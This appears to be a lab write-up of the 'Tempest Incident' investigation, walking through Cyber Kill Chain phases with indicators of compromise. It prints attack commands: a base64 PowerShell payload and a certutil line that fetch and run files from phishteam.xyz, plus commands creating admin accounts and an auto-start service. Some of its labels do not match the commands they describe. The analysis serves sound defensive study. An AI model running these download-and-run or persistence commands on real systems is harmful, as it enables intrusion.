# Adversary Investigation Using the Cyber Kill Chain

This repository documents the Tempest Incident investigation using the **Cyber Kill Chain** methodology, highlighting each phase of the attack and the indicators of compromise (IOCs) discovered during the investigation.

## Cyber Kill Chain Overview

The **Cyber Kill Chain**, developed by Lockheed Martin, outlines the stages adversaries follow during cyberattacks. The stages are:

1. **Reconnaissance**
2. **Weaponization**
3. **Delivery**
4. **Exploitation**
5. **Installation**
6. **Command and Control (C2)**
7. **Actions on Objectives**

---

## 1. Reconnaissance

The attacker conducted reconnaissance to identify the target and possible entry points, using methods like:

- **Social Engineering**: Phishing email that tricked the user into downloading a malicious document.
- **Open-Source Intelligence (OSINT)**: Collecting publicly available data about the target, such as company details, employee roles, and email addresses.
- **Network Scanning**: Likely used tools such as Nmap to scan the network for vulnerabilities.

---

## 2. Weaponization

The attacker crafted a malicious Microsoft Word document designed to exploit a known vulnerability.

- **Malicious Document**: `free_magicules.doc`
- **Exploit Used**: **CVE-2022-30190** (Follina) – a remote code execution vulnerability in Microsoft Word.
- **Tools Possibly Used**: Malicious document generators like Metasploit or Phishery.

---

## 3. Delivery

The malicious document was delivered through a phishing campaign that tricked the user into downloading and opening it.

- **Delivery Method**: Phishing email with a malicious document attachment.
- **Downloaded By**: `chrome.exe`
- **Filename**: `free_magicules.doc`
- **Potential Tools**: Email spoofing tools or compromised email accounts.

---

## 4. Exploitation

The victim opened the document, triggering the execution of a base64-encoded command.

- **Microsoft Word PID**: 496
- **Base64 Encoded Payload**: 
    ```
    JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
    ```
This payload downloaded and executed the second-stage payload (`first.exe`).

---

## 5. Installation

The malicious binary (`first.exe`) was downloaded and installed on the system.

- **Downloaded Payload**: `first.exe`
- **Downloaded From**: `http://phishteam.xyz/02dcf07/first.exe`
- **Installed At**: `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

---

## 6. Command and Control (C2)

A C2 connection was established, allowing the attacker to remotely control the system.

- **Malicious Domain**: `resolvecyber.xyz`
- **C2 Port**: 80
- **C2 Communication Command**:
    ```
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
    ```
- **C2 Binary Hash**: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
- **C2 Tool**: Chisel – reverse SOCKS proxy used to tunnel traffic through the compromised machine.

---

## 7. Actions on Objectives

The attacker performed internal reconnaissance, privilege escalation, and established persistence on the compromised system.

### Internal Reconnaissance
- Discovered a file containing the password `infernotempest`.
- Enumerated listening ports, discovering port 5985 for remote shell access.

### Privilege Escalation
The attacker used the `printspoofer` tool to escalate privileges.

- **Privilege Escalation Tool**: `spf.exe`
- **SHA256 Hash**: `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`

### Persistence Mechanism
The attacker created new accounts and set up a service for persistence:

- **Accounts Created**: `shion`, `shuna`
- **Persistence Commands**:
    ```
    net user shion /add
    net user shuna /add
    net localgroup administrators /add shion
    C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
    ```

---

## Indicators of Compromise (IOCs)

- **Malicious Document**: `free_magicules.doc`
- **Malicious Domains**: `phishteam.xyz`, `resolvecyber.xyz`
- **IP Address**: `167.71.199.191`

<img src="https://i.imgur.com/1CD8z5F.png" height="80%" width="80%" alt="LinkedInLearning"/>
<img src="https://i.imgur.com/K5aNsyI.png" height="80%" width="80%" alt="LinkedInLearning"/>
<img src="https://i.imgur.com/ELQXYpX.png" height="80%" width="80%" alt="LinkedInLearning"/>
<img src="https://i.imgur.com/sJbf07h.png" height="80%" width="80%" alt="LinkedInLearning"/>
---

## Conclusion

The investigation of the Tempest Incident revealed a sophisticated attack that followed the phases of the Cyber Kill Chain. The attacker used social engineering and a phishing campaign to deliver a malicious document exploiting a Microsoft Word vulnerability. This allowed them to install malware, establish a C2 connection, escalate privileges, and maintain persistence. Multiple indicators of compromise (IOCs) were identified, enabling future detections and prevention measures.
